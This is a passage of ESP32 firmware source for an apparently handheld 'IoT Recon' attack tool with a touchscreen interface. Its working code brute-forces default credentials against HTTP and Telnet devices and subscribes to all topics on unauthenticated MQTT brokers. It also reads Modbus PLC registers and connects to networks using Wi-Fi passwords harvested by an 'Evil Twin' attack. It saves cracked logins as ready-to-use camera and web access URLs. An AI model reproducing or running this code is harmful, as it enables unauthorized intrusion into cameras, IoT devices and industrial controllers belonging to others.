                    snprintf(msg, sizeof(msg), "[>] %s HTTP [%d/%d]...", ipStr, c, totalCredCount);
                    addKillLine(msg, HALEHOUND_GUNMETAL);
                    newEventFlag = true;
                }

                if (client.connect(devIP, port, 1000)) {
                    connFails = 0;
                    char authPlain[40];
                    snprintf(authPlain, sizeof(authPlain), "%s:%s", user, pass);
                    char authB64[64];
                    base64Encode(authPlain, strlen(authPlain), authB64, sizeof(authB64));

                    client.print("GET / HTTP/1.0\r\nHost: ");
                    client.print(ipStr);
                    client.print("\r\nAuthorization: Basic ");
                    client.print(authB64);
                    client.print("\r\nConnection: close\r\n\r\n");

                    unsigned long t0 = millis();
                    String resp = "";
                    while (client.connected() && millis() - t0 < 2000 && resp.length() < 128) {
                        while (client.available() && resp.length() < 128) {
                            resp += (char)client.read();
                        }
                        vTaskDelay(1);
                    }
                    client.stop();

                    if (resp.indexOf("200") >= 0 && resp.indexOf("401") < 0) {
                        cracked = true;
                        strncpy(dev.credUser, user, IOT_MAX_CRED_USER - 1);
                        strncpy(dev.credPass, pass, IOT_MAX_CRED_PASS - 1);
                        dev.status = IOT_CRACKED;
                        camerasCracked++;

                        char msg[52];
                        snprintf(msg, sizeof(msg), "[!!!] CRACKED %s %s:%s", ipStr, user, pass);
                        addKillLine(msg, HALEHOUND_HOTPINK);
                        newEventFlag = true;
                        infectNearestColumn(dev.ip);
                    }
                } else {
                    connFails++;
                    if (connFails >= 5) {
                        char msg[52];
                        snprintf(msg, sizeof(msg), "[!] %s HTTP blocked (5 fails)", ipStr);
                        addKillLine(msg, HALEHOUND_GUNMETAL);
                        newEventFlag = true;
                        break;
                    }
                }
                vTaskDelay(1);
            }

            if (!cracked) {
                dev.status = IOT_LOCKED;
                char msg[52];
                snprintf(msg, sizeof(msg), "[x] LOCKED %s (all failed)", ipStr);
                addKillLine(msg, HALEHOUND_GUNMETAL);
                newEventFlag = true;
            }
        }

        // ── CAMERA: XMEye/HTTPS only (no RTSP, no HTTP) — log as found ──
        if (dev.type == IOT_CAMERA && dev.status == IOT_FOUND && scanTaskRunning) {
            // Camera has no attackable ports (only 34567 or 443)
            char msg[52];
            snprintf(msg, sizeof(msg), "[*] %s %s (no HTTP/RTSP)", ipStr, dev.banner);
            addKillLine(msg, HALEHOUND_CYAN);
            newEventFlag = true;
        }

        // ── MQTT: Connect, subscribe #, dump topics ──
        if (dev.type == IOT_MQTT_BROKER && scanTaskRunning) {
            dev.status = IOT_TESTING;
            if (client.connect(devIP, 1883, 2000)) {
                // MQTT CONNECT packet (minimal, no auth)
                uint8_t mqttConnect[] = {
                    0x10,                   // CONNECT
                    0x10,                   // Remaining length = 16
                    0x00, 0x04,             // Protocol name length
                    'M', 'Q', 'T', 'T',    // Protocol name
                    0x04,                   // Protocol level (3.1.1)
                    0x02,                   // Connect flags (clean session)
                    0x00, 0x3C,             // Keep alive (60s)
                    0x00, 0x04,             // Client ID length
                    'H', 'H', 'C', 'Y'     // Client ID
                };
                client.write(mqttConnect, sizeof(mqttConnect));

                // Wait for CONNACK
                unsigned long t0 = millis();
                bool gotAck = false;
                while (client.connected() && millis() - t0 < 3000) {
                    if (client.available() >= 4) {
                        uint8_t b0 = client.read(); // Packet type
                        uint8_t b1 = client.read(); // Remaining len
                        uint8_t b2 = client.read(); // Session present
                        uint8_t b3 = client.read(); // Return code
                        if ((b0 & 0xF0) == 0x20 && b3 == 0x00) {
                            gotAck = true;
                        }
                        break;
                    }
                    vTaskDelay(1);
                }

                if (gotAck) {
                    dev.status = IOT_OPEN;
                    openServices++;

                    // Subscribe to # (all topics)
                    uint8_t mqttSub[] = {
                        0x82,               // SUBSCRIBE
                        0x06,               // Remaining length
                        0x00, 0x01,         // Packet ID
                        0x00, 0x01,         // Topic filter length
                        '#',                // Topic filter
                        0x00                // QoS 0
                    };
                    client.write(mqttSub, sizeof(mqttSub));

                    // Capture topics for up to 5 seconds
                    t0 = millis();
                    int topicsCaptured = 0;
                    while (client.connected() && millis() - t0 < 5000 && topicsCaptured < 50 && scanTaskRunning) {
                        if (client.available()) {
                            uint8_t type = client.read();
                            if ((type & 0xF0) == 0x30) { // PUBLISH
                                // Decode remaining length
                                uint32_t remLen = 0;
                                int shift = 0;
                                uint8_t enc;
                                do {
                                    if (!client.available()) break;
                                    enc = client.read();
                                    remLen |= (enc & 0x7F) << shift;
                                    shift += 7;
                                } while (enc & 0x80);

                                if (remLen > 0 && remLen < 256 && client.available() >= 2) {
                                    uint16_t topicLen = (client.read() << 8) | client.read();
                                    int bytesConsumed = 2; // topic length field
                                    if (topicLen > 0 && topicLen < 128) {
                                        char topic[128];
                                        int rd = 0;
                                        while (rd < topicLen && client.available()) {
                                            topic[rd++] = client.read();
                                        }
                                        topic[rd] = '\0';
                                        bytesConsumed += rd;
                                        topicsCaptured++;
                                    }
                                    // Skip remaining bytes (payload + any unread topic)
                                    int remaining = (int)remLen - bytesConsumed;
                                    while (remaining > 0 && client.available()) {
                                        client.read();
                                        remaining--;
                                    }
                                }
                            } else {
                                // Skip unknown packet
                                vTaskDelay(1);
                            }
                        }
                        vTaskDelay(1);
                    }

                    dev.mqttTopics = topicsCaptured;

                    // MQTT DISCONNECT
                    uint8_t mqttDisc[] = { 0xE0, 0x00 };
                    client.write(mqttDisc, sizeof(mqttDisc));

                    char msg[52];
                    snprintf(msg, sizeof(msg), "[*] OPEN %s MQTT (%d topics)", ipStr, topicsCaptured);
                    addKillLine(msg, HALEHOUND_GREEN);
                    newEventFlag = true;
                } else {
                    dev.status = IOT_LOCKED;
                    char msg[52];
                    snprintf(msg, sizeof(msg), "[x] %s MQTT auth required", ipStr);
                    addKillLine(msg, HALEHOUND_GUNMETAL);
                    newEventFlag = true;
                }
                client.stop();
            }
        }

        // ── TELNET: Default credential testing ──
        if (dev.type == IOT_TELNET_DEVICE && scanTaskRunning) {
            dev.status = IOT_TESTING;
            bool cracked = false;
            int connFails = 0;

            {
                char msg[52];
                snprintf(msg, sizeof(msg), "[>] Telnet brute %s (%d creds)", ipStr, totalCredCount);
                addKillLine(msg, HALEHOUND_CYAN);
                newEventFlag = true;
            }

            for (int c = 0; c < totalCredCount && scanTaskRunning && !cracked; c++) {
                currentCredIndex = c;
                const char* user;
                const char* pass;
                getCred(c, user, pass);

                // Progress every 10 creds
                if (c > 0 && c % 10 == 0) {
                    char msg[52];
                    snprintf(msg, sizeof(msg), "[>] %s Telnet [%d/%d]...", ipStr, c, totalCredCount);
                    addKillLine(msg, HALEHOUND_GUNMETAL);
                    newEventFlag = true;
                }

                if (client.connect(devIP, 23, 1000)) {
                    connFails = 0;
                    // Wait for login prompt
                    unsigned long t0 = millis();
                    String resp = "";
                    while (client.connected() && millis() - t0 < 3000 && resp.length() < 256) {
                        while (client.available()) {
                            resp += (char)client.read();
                        }
                        String rLow = resp;
                        rLow.toLowerCase();
                        if (rLow.indexOf("login") >= 0 || rLow.indexOf("user") >= 0 || rLow.indexOf(":") >= 0) break;
                        vTaskDelay(pdMS_TO_TICKS(50));
                    }

                    // Send username
                    client.print(user);
                    client.print("\r\n");
                    delay(500);

                    // Wait for password prompt
                    resp = "";
                    t0 = millis();
                    while (client.connected() && millis() - t0 < 2000 && resp.length() < 256) {
                        while (client.available()) {
                            resp += (char)client.read();
                        }
                        String rLow = resp;
                        rLow.toLowerCase();
                        if (rLow.indexOf("pass") >= 0 || rLow.indexOf(":") >= 0) break;
                        vTaskDelay(pdMS_TO_TICKS(50));
                    }

                    // Send password
                    client.print(pass);
                    client.print("\r\n");
                    delay(1000);

                    // Check for shell prompt
                    resp = "";
                    t0 = millis();
                    while (client.connected() && millis() - t0 < 2000 && resp.length() < 256) {
                        while (client.available()) {
                            resp += (char)client.read();
                        }
                        vTaskDelay(pdMS_TO_TICKS(50));
                    }
                    client.stop();

                    String rLow = resp;
                    rLow.toLowerCase();
                    // Shell prompt indicators
                    if (rLow.indexOf("$") >= 0 || rLow.indexOf("#") >= 0 ||
                        rLow.indexOf(">") >= 0 || rLow.indexOf("%") >= 0 ||
                        rLow.indexOf("welcome") >= 0 || rLow.indexOf("busybox") >= 0) {
                        // Check it's not a "failed" response
                        if (rLow.indexOf("incorrect") < 0 && rLow.indexOf("denied") < 0 &&
                            rLow.indexOf("failed") < 0 && rLow.indexOf("invalid") < 0) {
                            cracked = true;
                            strncpy(dev.credUser, user, IOT_MAX_CRED_USER - 1);
                            strncpy(dev.credPass, pass, IOT_MAX_CRED_PASS - 1);
                            dev.status = IOT_CRACKED;

                            char msg[52];
                            snprintf(msg, sizeof(msg), "[!!!] CRACKED %s telnet %s:%s", ipStr, user, pass);
                            addKillLine(msg, HALEHOUND_HOTPINK);
                            newEventFlag = true;
                            infectNearestColumn(dev.ip);
                        }
                    }
                } else {
                    connFails++;
                    if (connFails >= 5) {
                        char msg[52];
                        snprintf(msg, sizeof(msg), "[!] %s Telnet blocked (5 fails)", ipStr);
                        addKillLine(msg, HALEHOUND_GUNMETAL);
                        newEventFlag = true;
                        break;
                    }
                }
                vTaskDelay(1);
            }

            if (!cracked && dev.status == IOT_TESTING) {
                dev.status = IOT_LOCKED;
                char msg[52];
                snprintf(msg, sizeof(msg), "[x] LOCKED %s telnet", ipStr);
                addKillLine(msg, HALEHOUND_GUNMETAL);
                newEventFlag = true;
            }
        }

        // ── MODBUS: Read holding registers (no auth) ──
        if (dev.type == IOT_MODBUS_PLC && scanTaskRunning) {
            if (client.connect(devIP, 502, 2000)) {
                // Modbus TCP: Read Holding Registers (function 03)
                // Transaction ID=1, Protocol=0, Length=6, Unit=1, FC=3, Start=0, Qty=10
                uint8_t modbusReq[] = {
                    0x00, 0x01, // Transaction ID
                    0x00, 0x00, // Protocol ID
                    0x00, 0x06, // Length
                    0x01,       // Unit ID
                    0x03,       // Function code: Read Holding Registers
                    0x00, 0x00, // Start address
                    0x00, 0x0A  // Quantity (10 registers)
                };
                client.write(modbusReq, sizeof(modbusReq));

                unsigned long t0 = millis();
                bool gotResp = false;
                while (client.connected() && millis() - t0 < 2000) {
                    if (client.available() >= 9) {
                        gotResp = true;
                        break;
                    }
                    vTaskDelay(1);
                }
                client.stop();

                if (gotResp) {
                    dev.status = IOT_OPEN;
                    openServices++;
                    char msg[52];
                    snprintf(msg, sizeof(msg), "[*] OPEN %s Modbus (no auth)", ipStr);
                    addKillLine(msg, HALEHOUND_GREEN);
                } else {
                    dev.status = IOT_LOCKED;
                }
                newEventFlag = true;
            }
        }

        vTaskDelay(1);
    }

    // =========================================================================
    // PHASE 4: DONE
    // =========================================================================

    scanPhase = IOT_PHASE_DONE;
    addKillLine("=== SCAN COMPLETE ===", HALEHOUND_BRIGHT);
    if (hostsFound == 0) {
        addKillLine("[!] No devices found on subnet", HALEHOUND_HOTPINK);
        addKillLine("[!] Try a different network", HALEHOUND_GUNMETAL);
    } else {
        char summary[52];
        snprintf(summary, sizeof(summary), "[*] %d hosts, %d cracked, %d open",
                 (int)hostsFound, (int)camerasCracked, (int)openServices);
        addKillLine(summary, HALEHOUND_GREEN);
    }
    newEventFlag = true;

task_exit:
    #if CYD_DEBUG
    Serial.println("[IOT] Core 0: Scanner task exiting");
    #endif
    scanTaskRunning = false;
    scanTaskDone = true;
    scanTaskHandle = NULL;
    vTaskDelete(NULL);
}

// =============================================================================
// TASK LIFECYCLE
// =============================================================================

static void startScanTask() {
    if (scanTaskHandle) return;
    scanTaskRunning = true;
    scanTaskDone = false;
    xTaskCreatePinnedToCore(iotScanTask, "IotRecon", 8192, NULL, 1, &scanTaskHandle, 0);
}

static void stopScanTask() {
    scanTaskRunning = false;
    if (scanTaskHandle) {
        unsigned long t0 = millis();
        while (!scanTaskDone && (millis() - t0 < 2000)) {
            vTaskDelay(pdMS_TO_TICKS(10));
        }
        scanTaskHandle = NULL;
    }
}

// =============================================================================
// WIFI SCAN — List available networks for picker
// =============================================================================

static void doWifiScan() {
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);

    int n = WiFi.scanNetworks(false, false);
    networkCount = 0;
    for (int i = 0; i < n && networkCount < IOT_MAX_NETWORKS; i++) {
        String ssid = WiFi.SSID(i);
        if (ssid.length() == 0) continue;
        strncpy(foundNetworks[networkCount].ssid, ssid.c_str(), 32);
        foundNetworks[networkCount].ssid[32] = '\0';
        foundNetworks[networkCount].rssi = WiFi.RSSI(i);
        foundNetworks[networkCount].encType = WiFi.encryptionType(i);
        foundNetworks[networkCount].channel = WiFi.channel(i);
        networkCount++;
    }
    WiFi.scanDelete();
}

// =============================================================================
// WIFI CONNECT
// =============================================================================

static bool tryWiFiConnect() {
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);

    if (strlen(targetPass) > 0) {
        WiFi.begin(targetSSID, targetPass);
    } else {
        WiFi.begin(targetSSID); // Open network
    }

    unsigned long t0 = millis();
    while (WiFi.status() != WL_CONNECTED && millis() - t0 < 15000) {
        delay(250);
    }

    if (WiFi.status() == WL_CONNECTED) {
        gatewayIP = WiFi.gatewayIP();
        subnetMask = WiFi.subnetMask();
        localIP = WiFi.localIP();
        wifiConnected = true;
        return true;
    }
    return false;
}

// =============================================================================
// SD CARD REPORT
// =============================================================================

static void saveReportToSD() {
    spiDeselect();
    pinMode(SD_CS, OUTPUT);
    digitalWrite(SD_CS, HIGH);

    if (!SD.begin(SD_CS)) {
        SPI.begin(18, 19, 23, SD_CS);
        if (!SD.begin(SD_CS, SPI, 4000000)) {
            sdReady = false;
            return;
        }
    }
    sdReady = true;

    File f = SD.open("/iot_recon.txt", FILE_WRITE);
    if (!f) return;

    unsigned long elapsed = (millis() - scanStartTime) / 1000;
    int mins = elapsed / 60;
    int secs = elapsed % 60;

    f.println("=== IoT Recon Report ===");
    f.printf("Network: %d.%d.%d.%d/24\n", gatewayIP[0], gatewayIP[1], gatewayIP[2], 0);
    f.printf("Gateway: %d.%d.%d.%d\n", gatewayIP[0], gatewayIP[1], gatewayIP[2], gatewayIP[3]);
    f.printf("Scan Duration: %dm %ds\n", mins, secs);
    f.printf("Hosts Found: %d\n\n", (int)hostsFound);

    for (int d = 0; d < deviceCount; d++) {
        IotDevice& dev = devices[d];
        char ipStr[16];
        ipToStr(dev.ip, ipStr, sizeof(ipStr));

        const char* statusStr = "FOUND";
        switch (dev.status) {
            case IOT_CRACKED: statusStr = "CRACKED"; break;
            case IOT_OPEN:    statusStr = "OPEN";    break;
            case IOT_LOCKED:  statusStr = "LOCKED";  break;
            case IOT_TESTING: statusStr = "TESTING"; break;
            default: break;
        }

        const char* typeStr = "Unknown";
        switch (dev.type) {
            case IOT_CAMERA:       typeStr = "IP Camera";      break;
            case IOT_MQTT_BROKER:  typeStr = "MQTT Broker";    break;
            case IOT_TELNET_DEVICE:typeStr = "Telnet Device";  break;
            case IOT_MODBUS_PLC:   typeStr = "Modbus PLC";     break;
            case IOT_HTTP_DEVICE:  typeStr = "HTTP Device";    break;
            default: break;
        }

        f.printf("[%s] %s\n", statusStr, ipStr);
        f.printf("  Type: %s (%s)\n", typeStr, dev.banner);

        // Ports
        f.print("  Ports:");
        for (int p = 0; p < IOT_MAX_PORTS; p++) {
            if (dev.openPorts & (1 << p)) {
                f.printf(" %d", scanPorts[p]);
            }
        }
        f.println();

        if (dev.status == IOT_CRACKED) {
            f.printf("  Creds: %s:%s\n", dev.credUser, dev.credPass);
            f.println("  --- ACCESS URLS ---");
            if (dev.openPorts & 0x01) {
                f.printf("  RTSP: rtsp://%s:%s@%s:554/\n", dev.credUser, dev.credPass, ipStr);
            }
            if (dev.openPorts & 0x02) {
                f.printf("  WEB:  http://%s:%s@%s/\n", dev.credUser, dev.credPass, ipStr);
            }
            if (dev.openPorts & 0x04) {
                f.printf("  WEB:  http://%s:%s@%s:8080/\n", dev.credUser, dev.credPass, ipStr);
            }
            if (dev.openPorts & 0x40) {
                f.printf("  HTTPS: https://%s:%s@%s/\n", dev.credUser, dev.credPass, ipStr);
            }
            if (dev.openPorts & 0x08) {
                f.printf("  TELNET: telnet %s (user: %s pass: %s)\n", ipStr, dev.credUser, dev.credPass);
            }
        }

        if (dev.type == IOT_MQTT_BROKER && dev.status == IOT_OPEN) {
            f.printf("  Auth: NONE (no password!)\n");
            f.printf("  MQTT: mqtt://%s:1883/\n", ipStr);
            f.printf("  Topics: %d captured\n", dev.mqttTopics);
        }

        f.println();
    }

    f.close();
    SD.end();
}

// =============================================================================
// LOAD CAPTURED CREDS FROM SD (/creds.txt)
// Format: [PSK] SSID | password | BSSID | CH
// =============================================================================

static void loadCapturedCreds() {
    capturedCredCount = 0;
    spiDeselect();
    pinMode(SD_CS, OUTPUT);
    digitalWrite(SD_CS, HIGH);

    if (!SD.begin(SD_CS)) {
        SPI.begin(18, 19, 23, SD_CS);
        if (!SD.begin(SD_CS, SPI, 4000000)) {
            return;
        }
    }

    File f = SD.open("/creds.txt", FILE_READ);
    if (!f) { SD.end(); return; }

    while (f.available() && capturedCredCount < IOT_MAX_CREDS) {
        String line = f.readStringUntil('\n');
        line.trim();
        if (!line.startsWith("[PSK]")) continue;

        // Parse: [PSK] SSID | password | BSSID | CH
        int p1 = line.indexOf('|');
        if (p1 < 0) continue;
        int p2 = line.indexOf('|', p1 + 1);
        if (p2 < 0) continue;

        String ssid = line.substring(6, p1); // After "[PSK] "
        ssid.trim();
        String psk = line.substring(p1 + 1, p2);
        psk.trim();

        if (ssid.length() == 0 || psk.length() == 0) continue;

        strncpy(capturedCreds[capturedCredCount].ssid, ssid.c_str(), 32);
        capturedCreds[capturedCredCount].ssid[32] = '\0';
        strncpy(capturedCreds[capturedCredCount].psk, psk.c_str(), 64);
        capturedCreds[capturedCredCount].psk[64] = '\0';
        capturedCredCount++;
    }

    f.close();
    SD.end();
}

// =============================================================================
// LOAD SD WORDLIST (/iot_creds.txt)
// Format: "username:password" per line, or just "password" (assumes admin)
// Lines starting with # = comments. Empty lines skipped.
// =============================================================================

static void loadSdWordlist() {
    sdCredCount = 0;
    spiDeselect();
    pinMode(SD_CS, OUTPUT);
    digitalWrite(SD_CS, HIGH);

    if (!SD.begin(SD_CS)) {
        SPI.begin(18, 19, 23, SD_CS);
        if (!SD.begin(SD_CS, SPI, 4000000)) {
            totalCredCount = CRED_COUNT;
            return;
        }
    }

    File f = SD.open("/iot_creds.txt", FILE_READ);
    if (!f) {
        SD.end();
        totalCredCount = CRED_COUNT;
        return;
    }

    while (f.available() && sdCredCount < IOT_MAX_SD_CREDS) {
        String line = f.readStringUntil('\n');
        line.trim();
        if (line.length() == 0) continue;
        if (line.charAt(0) == '#') continue; // Comment

        int sep = line.indexOf(':');
        if (sep > 0 && sep < (int)line.length() - 1) {
            // username:password format
            String user = line.substring(0, sep);
            String pass = line.substring(sep + 1);
            user.trim();
            pass.trim();
            strncpy(sdCreds[sdCredCount].user, user.c_str(), IOT_MAX_CRED_USER - 1);
            sdCreds[sdCredCount].user[IOT_MAX_CRED_USER - 1] = '\0';
            strncpy(sdCreds[sdCredCount].pass, pass.c_str(), IOT_MAX_CRED_PASS - 1);
            sdCreds[sdCredCount].pass[IOT_MAX_CRED_PASS - 1] = '\0';
        } else if (sep == (int)line.length() - 1) {
            // "username:" format — blank password
            String user = line.substring(0, sep);
            user.trim();
            strncpy(sdCreds[sdCredCount].user, user.c_str(), IOT_MAX_CRED_USER - 1);
            sdCreds[sdCredCount].user[IOT_MAX_CRED_USER - 1] = '\0';
            sdCreds[sdCredCount].pass[0] = '\0';
        } else {
            // Just a password — assume "admin" as username
            strncpy(sdCreds[sdCredCount].user, "admin", IOT_MAX_CRED_USER - 1);
            strncpy(sdCreds[sdCredCount].pass, line.c_str(), IOT_MAX_CRED_PASS - 1);
            sdCreds[sdCredCount].pass[IOT_MAX_CRED_PASS - 1] = '\0';
        }
        sdCredCount++;
    }

    f.close();
    SD.end();
    totalCredCount = CRED_COUNT + sdCredCount;
}

// =============================================================================
// DISPLAY: Captured Creds Screen
// =============================================================================

static void drawCredsScreen() {
    tft.fillScreen(HALEHOUND_BLACK);
    drawStatusBar();
    drawInoIconBar();

    drawGlitchTitle(SCALE_Y(55), "IoT RECON");
    drawGlitchStatus(SCALE_Y(80), "HARVESTED", HALEHOUND_HOTPINK);

    if (capturedCredCount == 0) {
        tft.setTextColor(HALEHOUND_GUNMETAL);
        tft.setTextSize(1);
        tft.setCursor(5, SCALE_Y(110));
        tft.print("No PSK creds on SD card.");
        tft.setCursor(5, SCALE_Y(125));
        tft.print("Run Evil Twin first to");
        tft.setCursor(5, SCALE_Y(140));
        tft.print("harvest WiFi passwords.");
    } else {
        int listY = SCALE_Y(100);
        int lineH = SCALE_H(28);
        int visibleLines = (SCALE_Y(280) - listY) / lineH;

        for (int i = credScroll; i < capturedCredCount && (i - credScroll) < visibleLines; i++) {
            int y = listY + (i - credScroll) * lineH;

            // Background highlight
            tft.fillRect(3, y, SCREEN_WIDTH - 6, lineH - 2, HALEHOUND_DARK);
            tft.drawRect(3, y, SCREEN_WIDTH - 6, lineH - 2, HALEHOUND_MAGENTA);

            // SSID
            tft.setTextColor(HALEHOUND_CYAN);
            tft.setTextSize(1);
            tft.setCursor(8, y + 3);
            String ssidDisp = String(capturedCreds[i].ssid);
            if (ssidDisp.length() > 20) ssidDisp = ssidDisp.substring(0, 20);
            tft.print(ssidDisp);

            // PSK (masked with first/last 2 chars visible)
            tft.setTextColor(HALEHOUND_HOTPINK);
            tft.setCursor(8, y + 14);
            String psk = String(capturedCreds[i].psk);
            if (psk.length() > 4) {
                tft.printf("%c%c***%c%c", psk[0], psk[1], psk[psk.length()-2], psk[psk.length()-1]);
            } else {
                tft.print("****");
            }
        }
    }

    // Back button
    int btnY = SCALE_Y(290);
    int btnW = SCALE_W(70);
    int btnH = SCALE_H(22);

    tft.fillRoundRect(5, btnY, btnW, btnH, 3, HALEHOUND_DARK);
    tft.drawRoundRect(5, btnY, btnW, btnH, 3, HALEHOUND_HOTPINK);
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(22, btnY + btnH / 3);
    tft.print("Back");
}

static void handleCredsTouch(int x, int y) {
    // Back icon bar
    if (y >= (ICON_BAR_Y - 2) && y <= (ICON_BAR_BOTTOM + 4) && x >= 5 && x <= 30) {
        currentScreen = IOT_SCR_WIFI_SCAN;
        drawWifiScanScreen();
        waitForTouchRelease();
        return;
    }

    // Tap a credential to use it
    int listY = SCALE_Y(100);
    int lineH = SCALE_H(28);
    int visibleLines = (SCALE_Y(280) - listY) / lineH;

    for (int i = 0; i < visibleLines && (i + credScroll) < capturedCredCount; i++) {
        int itemY = listY + i * lineH;
        if (y >= itemY && y < itemY + lineH) {
            int idx = i + credScroll;
            strncpy(targetSSID, capturedCreds[idx].ssid, 32);
            targetSSID[32] = '\0';
            strncpy(targetPass, capturedCreds[idx].psk, 64);
            targetPass[64] = '\0';
            currentScreen = IOT_SCR_CONNECTING;
            drawConnectingScreen();
            waitForTouchRelease();
            return;
        }
    }

    // Back button
    int btnY = SCALE_Y(290);
    int btnW = SCALE_W(70);
    int btnH = SCALE_H(22);
    if (x >= 5 && x <= 5 + btnW && y >= btnY && y <= btnY + btnH + 3) {
        currentScreen = IOT_SCR_WIFI_SCAN;
        drawWifiScanScreen();
        waitForTouchRelease();
        return;
    }
}

// =============================================================================
// DISPLAY: WiFi Network Picker
// =============================================================================

static void drawWifiScanScreen() {
    tft.fillScreen(HALEHOUND_BLACK);
    drawStatusBar();
    drawInoIconBar();

    drawGlitchTitle(SCALE_Y(55), "IoT RECON");
    drawGlitchStatus(SCALE_Y(80), "SELECT TARGET", HALEHOUND_HOTPINK);

    // Scanning indicator
    tft.setTextColor(HALEHOUND_CYAN);
    tft.setTextSize(1);
    tft.setCursor(5, SCALE_Y(100));
    tft.print("Scanning WiFi networks...");

    // Show network list
    int listY = SCALE_Y(115);
    int lineH = SCALE_H(18);
    int visibleLines = (SCALE_Y(280) - listY) / lineH;

    for (int i = networkScroll; i < networkCount && (i - networkScroll) < visibleLines; i++) {
        int y = listY + (i - networkScroll) * lineH;
        bool isOpen = (foundNetworks[i].encType == WIFI_AUTH_OPEN);

        // Signal bars
        int bars = 0;
        if (foundNetworks[i].rssi > -50) bars = 4;
        else if (foundNetworks[i].rssi > -60) bars = 3;
        else if (foundNetworks[i].rssi > -70) bars = 2;
        else if (foundNetworks[i].rssi > -80) bars = 1;

        // Draw signal bars
        for (int b = 0; b < 4; b++) {
            uint16_t barColor = (b < bars) ? HALEHOUND_GREEN : HALEHOUND_GUNMETAL;
            tft.fillRect(5 + b * 4, y + (12 - (b + 1) * 3), 3, (b + 1) * 3, barColor);
        }

        // Lock icon or open
        tft.setTextColor(isOpen ? HALEHOUND_GREEN : HALEHOUND_MAGENTA);
        tft.setCursor(22, y + 2);
        tft.print(isOpen ? "*" : "L");

        // SSID
        tft.setTextColor(HALEHOUND_CYAN);
        tft.setCursor(32, y + 2);
        String ssidDisp = String(foundNetworks[i].ssid);
        if (ssidDisp.length() > 28) ssidDisp = ssidDisp.substring(0, 28);
        tft.print(ssidDisp);

        // Channel
        tft.setTextColor(HALEHOUND_GUNMETAL);
        tft.setCursor(SCREEN_WIDTH - 25, y + 2);
        tft.printf("ch%d", foundNetworks[i].channel);
    }

    // Buttons at bottom
    int btnY = SCALE_Y(290);
    int btnW = SCALE_W(70);
    int btnH = SCALE_H(22);

    // Rescan button
    tft.fillRoundRect(5, btnY, btnW, btnH, 3, HALEHOUND_DARK);
    tft.drawRoundRect(5, btnY, btnW, btnH, 3, HALEHOUND_HOTPINK);
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(12, btnY + btnH / 3);
    tft.print("Rescan");

    // Manual entry button
    int manX = SCALE_X(82);
    tft.fillRoundRect(manX, btnY, btnW, btnH, 3, HALEHOUND_DARK);
    tft.drawRoundRect(manX, btnY, btnW, btnH, 3, HALEHOUND_MAGENTA);
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(manX + 6, btnY + btnH / 3);
    tft.print("Manual");

    // Captured creds button
    int credX = SCALE_X(162);
    tft.fillRoundRect(credX, btnY, btnW, btnH, 3, HALEHOUND_DARK);
    tft.drawRoundRect(credX, btnY, btnW, btnH, 3, HALEHOUND_GREEN);
    tft.setTextColor(HALEHOUND_GREEN);
    tft.setCursor(credX + 8, btnY + btnH / 3);
    tft.print("Creds");
}

// =============================================================================
// DISPLAY: On-Screen Keyboard
// =============================================================================

static void drawKeyboardScreen(const char* prompt, int maxLen) {
    tft.fillRect(0, CONTENT_Y_START, SCREEN_WIDTH, SCREEN_HEIGHT - CONTENT_Y_START, HALEHOUND_BLACK);

    // Icon bar
    tft.fillRect(0, ICON_BAR_Y, SCREEN_WIDTH, ICON_BAR_H, HALEHOUND_DARK);
    tft.drawBitmap(10, ICON_BAR_Y, bitmap_icon_go_back, 16, 16, HALEHOUND_MAGENTA);
    tft.drawLine(0, ICON_BAR_BOTTOM, SCREEN_WIDTH, ICON_BAR_BOTTOM, HALEHOUND_HOTPINK);

    // Prompt
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setTextSize(1);
    tft.setCursor(5, SCALE_Y(42));
    tft.print(prompt);

    // Input box
    int boxY = SCALE_Y(55);
    tft.fillRect(10, boxY, SCREEN_WIDTH - 20, SCALE_H(25), HALEHOUND_DARK);
    tft.drawRect(10, boxY, SCREEN_WIDTH - 20, SCALE_H(25), HALEHOUND_HOTPINK);
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(15, boxY + 7);
    tft.print(kbInput);

    // Draw keyboard
    int yOffset = SCALE_Y(85);
    for (int row = 0; row < 4; row++) {
        int xOffset = 5;
        for (int col = 0; col < (int)strlen(kbLayout[row]); col++) {
            tft.fillRect(xOffset, yOffset, kbKeyW, kbKeyH, HALEHOUND_DARK);
            tft.drawRect(xOffset, yOffset, kbKeyW, kbKeyH, HALEHOUND_GUNMETAL);
            tft.setTextColor(HALEHOUND_MAGENTA);
            tft.setTextSize(1);
            tft.setCursor(xOffset + kbKeyW / 3, yOffset + kbKeyH / 4);
            tft.print(kbLayout[row][col]);
            xOffset += kbKeyW + kbKeySp;
        }
        yOffset += kbKeyH + kbKeySp;
    }

    // Buttons: Back, Clear, Skip (pass only), OK
    int btnW = SCALE_W(53);
    int btnH = SCALE_H(22);
    int btnY = SCALE_Y(170);

    tft.fillRoundRect(5, btnY, btnW, btnH, 3, HALEHOUND_DARK);
    tft.drawRoundRect(5, btnY, btnW, btnH, 3, HALEHOUND_HOTPINK);
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(10, btnY + btnH / 3);
    tft.print("Back");

    int clrX = SCALE_X(63);
    tft.fillRoundRect(clrX, btnY, btnW, btnH, 3, HALEHOUND_DARK);
    tft.drawRoundRect(clrX, btnY, btnW, btnH, 3, HALEHOUND_MAGENTA);
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(clrX + 5, btnY + btnH / 3);
    tft.print("Clear");

    if (currentScreen == IOT_SCR_KEYBOARD_PASS) {
        int skipX = SCALE_X(121);
        tft.fillRoundRect(skipX, btnY, btnW, btnH, 3, HALEHOUND_DARK);
        tft.drawRoundRect(skipX, btnY, btnW, btnH, 3, HALEHOUND_GREEN);
        tft.setTextColor(HALEHOUND_GREEN);
        tft.setCursor(skipX + 5, btnY + btnH / 3);
        tft.print("Skip");
    }

    int okX = SCALE_X(179);
    tft.fillRoundRect(okX, btnY, btnW, btnH, 3, HALEHOUND_DARK);
    tft.drawRoundRect(okX, btnY, btnW, btnH, 3, HALEHOUND_MAGENTA);
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(okX + SCALE_W(17), btnY + btnH / 3);
    tft.print("OK");

    // Help text
    tft.setTextColor(HALEHOUND_GUNMETAL);
